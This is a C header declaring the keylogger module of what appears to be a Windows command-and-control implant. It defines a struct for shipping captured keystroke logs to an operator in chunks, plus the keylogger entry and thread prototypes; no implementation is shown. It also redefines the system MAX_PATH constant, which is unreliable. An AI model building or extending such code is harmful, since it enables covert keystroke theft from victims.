#pragma once
#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_KEYLOGGER
#define MAX_PATH 0x2000

typedef struct _KEYLOGGER_DOWNLOAD {
    unsigned char* keylog_data;    // Buffer containing the keylog data
    DWORD keylog_size;             // Size of the keylog data
    CHAR fileUuid[37];             // File UUID (36 + 1 for null terminator)
    CHAR filepath[MAX_PATH];       // Path to the file (e.g., "keylog.txt")
    DWORD totalChunks;             // Total number of chunks
    UINT32 currentChunk;           // Current chunk number
} KEYLOGGER_DOWNLOAD, *PKEYLOGGER_DOWNLOAD;

VOID Keylogger(_In_ PCHAR taskUuid, _In_ PPARSER arguments);

DWORD WINAPI KeyloggerThread(_In_ LPVOID lpTaskParameter);

#endif // INCLUDE_CMD_KEYLOGGER

#endif // KEYLOGGER_H